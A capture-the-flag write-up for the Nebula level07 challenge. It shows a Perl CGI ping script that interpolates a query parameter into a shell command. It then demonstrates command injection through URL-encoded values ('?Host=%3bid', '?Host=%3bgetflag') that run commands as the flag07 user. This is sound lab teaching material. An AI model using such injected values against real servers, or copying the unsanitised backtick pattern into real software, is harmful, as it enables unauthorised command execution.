## Challenge
The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

## Solution
```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```
Very basic CGI used to ping a host, smells like `command-injection`.
```console
level07@nebula:/home/flag07$ perl index.cgi
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
</pre></body></html>
```
But wait, no `setuid`?

That means we won't run as `flag07`!
```console
level07@nebula:/home/flag07$ ls -l
total 5
-rwxr-xr-x 1 root root  368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 root root 3719 2011-11-20 21:22 thttpd.conf
```
`thttpd` is a simple webserver, `thttpd.conf` is a configuration file for it.
* `port=7007`
* `dir=/home/flag07`
* `user=flag07`

Alright! let's contact it.
```console
level07@nebula:/home/flag07$ wget -qO- "http://127.0.0.1:7007/index.cgi"
<html><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
</pre></body></html>
level07@nebula:/home/flag07$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1"
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.006 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.010 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.010 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.006/0.008/0.010/0.003 ms
</pre></body></html>
```
Try injecting a command through the query parameter `Host`.

`?Host=;id` -> URL encoding -> `?Host=%3bid`
```console
level07@nebula:/home/flag07$ wget -qO- "http://192.168.157.3:7007/index.cgi?Host=%3bid"
<html><head><title>Ping results</title></head><body><pre>uid=992(flag07) gid=992(flag07) groups=992(flag07)
</pre></body></html>
level07@nebula:/home/flag07$ wget -qO- "http://192.168.157.3:7007/index.cgi?Host=%3bgetflag"
<html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
</pre></body></html>
```
## Bonus
The `O` argument's value in `wget -qO-` means `stdout`, It's a convention in linux for `-` to siginify `stdout`/`stdin`.
